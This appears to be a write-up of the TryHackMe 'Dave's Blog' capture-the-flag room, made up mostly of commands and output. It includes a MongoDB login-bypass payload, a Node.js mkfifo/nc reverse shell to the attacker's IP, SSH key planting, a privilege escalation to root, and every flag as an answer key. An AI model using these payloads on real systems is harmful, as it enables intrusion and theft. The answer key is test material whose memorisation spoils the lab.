# Dave's Blog

My friend Dave made his own blog!

[Dave's Blog](https://tryhackme.com/room/davesblog)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Code Injection
- MongoDB Enumeration
- Misconfigured Binaries
- Reverse Engineering

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Dave's Blog

My friend Dave made his own blog! You should go check it out.

The machine may take a few minutes to fully start up.

```
ali@kali:~/CTFs/tryhackme/Dave's Blog$ sudo nmap -sS -sC -sV -O 10.10.202.250
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 14:38 CEST
Nmap scan report for 10.10.202.250
Host is up (0.034s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Dave's Blog
3000/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-title: Dave's Blog
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
```

```
kali@kali:~/CTFs/tryhackme/Dave's Blog$ gobuster dir -u 10.10.202.250 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.202.250
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/22 14:40:47 Starting gobuster
===============================================================
/admin (Status: 200)
/Admin (Status: 200)
/ADMIN (Status: 200)
/images (Status: 301)
/javascripts (Status: 301)
/robots.txt (Status: 200)
/stylesheets (Status: 301)
===============================================================
2020/10/22 14:41:05 Finished
===============================================================
```

[http://10.10.202.250/admin](http://10.10.202.250/admin)

```html
<script>
  if (document.location.hash) {
    const div = document.createElement("div");
    div.innerText = decodeURIComponent(document.location.hash.substr(1));
    div.className = "note";
    document.body.insertBefore(div, document.body.firstChild);
  }
  document.querySelector("form").onsubmit = (e) => {
    /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
  };
</script>
```

```
POST /admin HTTP/1.1
Host: 10.10.202.250:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.202.250:3000/admin
Content-Type: application/json
Content-Length: 25
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDMzNzE5MDh9.79MYgVd6g0mmXF72wusU6_sVeuPrdod6PmW5j8ADsVg
Upgrade-Insecure-Requests: 1

{"username":"dave","password":{"$ne":""}}
```

```
HTTP/1.1 302 Found
X-Powered-By: Express
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE2MDMzNzE5NjB9.NnSNoBEYTN3FwwYzUXZ1ch8VH9erW_wYVXqW7fvxGeo; Path=/
Location: /admin
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 56
Date: Thu, 22 Oct 2020 13:06:00 GMT
Connection: close

<p>Found. Redirecting to <a href="/admin">/admin</a></p>
```

```
{
  "isAdmin": true,
  "_id": "5ec6e5cf1dc4d364bf864107",
  "username": "dave",
  "password": "THM{SuperSecureAdminPassword123}",
  "__v": 0,
  "iat": 1603371960
}
```

```
require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f', ()=>{})
```

```
kali@kali:~/CTFs/tryhackme/Dave's Blog$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.202.250 44048
/bin/sh: 0: can't access tty; job control turned off
$ whoami
dave
$ python -c "import pty; pty.spawn('/bin/bash')"
dave@daves-blog:~/blog$ ls
ls
app.js  helpers  node_modules  public  settings.json  yarn.lock
bin     models   package.json  routes  views
dave@daves-blog:~/blog$ cd ~
cd ~
dave@daves-blog:~$ ls
ls
blog  startup.sh  user.txt
dave@daves-blog:~$ cat user.txt
cat user.txt
THM{5fa1f779d1835367fdcfa4741bebb88a}
```

```
dave@daves-blog:~$ mongo
mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
Server has startup warnings:
2020-10-22T12:22:29.062+0000 I STORAGE  [initandlisten]
2020-10-22T12:22:29.062+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2020-10-22T12:22:29.063+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten]
2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2020-10-22T12:22:32.627+0000 I CONTROL  [initandlisten]
> show databases;
shshow databases;
admin       0.000GB
config      0.000GB
daves-blog  0.000GB
local       0.000GB
> use daves-blog
ususe daves-blog
switched to db daves-blog
> show tables
shshow tables
posts
users
whatcouldthisbes
> db.whatcouldthisbes.find()
dbdb.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}", "__v" : 0 }
>
```

```
dave@daves-blog:/$ sudo -l
sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
dave@daves-blog:/$ strings uid_checker
strings uid_checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
puts
printf
getgid
system
getuid
strcmp
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
How did you get here???
/bin/sh
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Your UID is: %d
Your GID is: %d
THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
Wow! You found the secret function! I still need to finish it..
Invalid choice
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
uid.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
_edata
getuid@@GLIBC_2.2.5
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
getgid@@GLIBC_2.2.5
gets@@GLIBC_2.2.5
secret
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
__TMC_END__
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
dave@daves-blog:/$
```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /home/dave/.ssh/authorized_keys
```

```
kali@kali:~/CTFs/tryhackme/Daves Blog$ python3 exploit.py
[+] Connecting to 10.10.202.250 on port 22: Done
[*] dave@10.10.202.250:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'sudo' on 10.10.202.250: pid 1608
b'Welcome to the UID checker!\n'
b'Enter 1 to check your UID or enter 2 to check your GID\n'
[*] Switching to interactive mode
Invalid choice
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
THM{a0a9c4f6809c84e212ac889d39b9cb48}
```

1. Flag 1

`THM{SuperSecureAdminPassword123}`

2. Flag 2 / User flag

`THM{5fa1f779d1835367fdcfa4741bebb88a}`

3. Flag 3

`THM{993e107fc66844482bb5dd0e4c485d5b}`

4. Flag 4

`THM{runn1ng_str1ngs_1s_b4sic4lly_RE}`

5. Flag 5 / Root flag

`THM{a0a9c4f6809c84e212ac889d39b9cb48}`
